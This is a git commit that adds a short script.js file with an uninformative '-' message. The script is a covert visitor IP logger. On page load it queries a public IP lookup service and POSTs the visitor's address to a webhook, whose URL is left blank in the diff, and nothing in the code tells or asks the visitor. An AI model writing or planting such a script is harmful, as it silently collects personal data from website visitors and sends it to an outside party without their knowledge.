812a62ca2a564537d1c521395145c6edf99228e0
Dawid Stolarczyk <101020209+dawid-stolarczyk@users.noreply.github.com>
2023-07-07 09:11:09 +0200

    -

---
+++ script.js
@@ -0,0 +1,20 @@
+var ip = ''
+fetch('https://api.ipify.org/?format=json')
+	.then(function (response) {
+		return response.json()
+	})
+	.then(function (data) {
+		ip = data.ip
+		var webhook = ''
+		var message = {
+			content: 'IP:' + ip,
+		}
+
+		fetch(webhook, {
+			method: 'POST',
+			headers: {
+				'Content-Type': 'application/json',
+			},
+			body: JSON.stringify(message),
+		})
+	})
